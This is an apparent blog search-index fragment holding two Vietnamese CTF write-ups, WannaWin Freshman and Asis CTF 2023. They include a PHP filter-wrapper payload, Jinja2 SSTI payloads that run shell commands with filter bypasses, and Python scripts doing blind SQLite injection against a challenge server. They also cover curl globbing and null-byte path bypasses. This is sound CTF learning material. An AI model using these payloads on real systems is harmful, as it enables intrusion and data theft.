    "snippet": "WannaWinFreshman-WriteupBài 1 Warmup PHP:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file tron...",
    "content": "WannaWinFreshman-WriteupBài 1 Warmup PHP:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server      Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK        Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flagthành\\u0070hp://filter/convert.base64-encode/resource=/flag    Decode base64 và ra flag  Flag: W1{w3lc0m3_w3b_w4rrj0rs}    Bài 2 Namename:            Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n    Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2  Payload : {{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}      Và nó bị chặn         Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr     Payload mới: {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}  Và nó đã hoạt động      Bây giờ sửa lại payload từ ls sang cat flag.txt    Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải)  {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}  Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag  Flag: W1{U_are_master_in_SSTI}    Bài 3 Solite:        Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được  Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)  Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection      Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter        Đây là query của bài    Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng  Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--  Tóm tắt :  Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'  select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%' sẽ trả về tên của tất cả các bảng  substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i  1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE '%1' và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả  Đây là script mình tìm tên của bảngimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"payload=\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--\"table_name = \"\"haha = 0for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--\" %(i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            table_name += ps            print(\"Table names: \",table_name)            haha +=1    if haha &lt; i:        breakprint(\"Success all the names of the tables are:\",table_name)  Và tìm ra được tên của các bảng làTables: API,flag_c1abd148_acae_40be_a953_eae333f90da0  Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi  Script của mìnhimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"table_name = \"flag_c1abd148_acae_40be_a953_eae333f90da0\"#payload = \"1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--\"haha = 0flag =\"\"for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select flag from %s),%d,1) is '%c'--\" %(table_name,i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            flag += ps            print(\"Flag is: \",flag)            haha +=1    if haha &lt; i:        breakprint(\"Here is your flag:\",flag)  Flag: W1{I_th1nk_u_r_so_lite^_^}    Bài 4 Differences:        Flag ngay ở trong file  Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????}    Bài 5 Free Flag:        Đọc file pcapng ta tìm được source và keyimport base64BANNER = \"\"\" ___       __   ________  ________   ________   ________  ___       __     _____  ________      |\\  \\     |\\  \\|\\   __  \\|\\   ___  \\|\\   ___  \\|\\   __  \\|\\  \\     |\\  \\  / __  \\|\\   ___  \\    \\ \\  \\    \\ \\  \\ \\  \\|\\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\|\\  \\ \\  \\    \\ \\  \\|\\/_|\\  \\ \\  \\\\\\ \\  \\    \\ \\  \\  __\\ \\  \\ \\   __  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\   __  \\ \\  \\  __\\ \\  \\|/ \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\  \\|\\__\\_\\  \\ \\  \\ \\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\ \\  \\ \\  \\|\\__\\_\\  \\   \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\   \\ \\__\\ \\__\\\\\\ \\__\\\\    \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________|    \\|__|\\|__| \\|__|\"\"\"KEY = bytes.fromhex('deadbeef')def encryptSecret(secret):    lst_byte = []    for i in range(len(secret)):        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]        lst_byte.append(enc_byte.to_bytes(1, 'big'))        return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()if __name__=='__main__':    print(BANNER)    secret = input(\"&gt; Please give me your secret: \")    print(\"\\n&gt; Here is your encrypted secret:\", encryptSecret(secret)  Decrypt lại ta sẽ có flagimport base64KEY = bytes.fromhex('deadbeef')def decryptSecret(encrypted_secret):    encrypted_bytes = base64.b64decode(encrypted_secret.encode())    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])    return decrypted_textsecret = \"iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=\"print(decryptSecret(secret))  Flag: W1{w3llC0mE_tO_w4nNaw1N}  Mấy bài còn lại mình chưa biết làm do dark quá"
  },
  
  {
    "title": "Asis CTF 2023 Writeup",
    "url": "/posts/AsisCTF/",
    "categories": "CTF Writeup",
    "tags": "",
    "date": "2023-09-24 23:00:00 +0700",
    





    
    "snippet": "Asis-CTF-2023-WriteupBài 1 hello:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn ...",
    "content": "Asis-CTF-2023-WriteupBài 1 hello:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt  Đọc đề, đề gợi ý cho mình đọc manpage của curl  Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới  Đây là payload của mình ?x=f[a-i]le:///ne[b-x]t.txt  Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới  Theo đường dẫn, đi tới đoạn thứ 2  Decode Base64 ra để lấy nội dung  Chắc chắn /app/index.js là source nên mình đã đọc nó  Decode tiếp thì ra source code  Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next  Sau khi phân tích code nhận ra lỗi ở 2 chổ này  path.basename(fpath) sẽ trả lại cái tên file về cho mình còn fs.readFileSync(fpath) sẽ đọc file của fpath  Sau một số thử nghiệm thì đây là payload cuối cùng của mình /next.txt%00/yuu.txt  Decode  Decode  Flag: ASIS{good_job_bun}"
  }
  
]

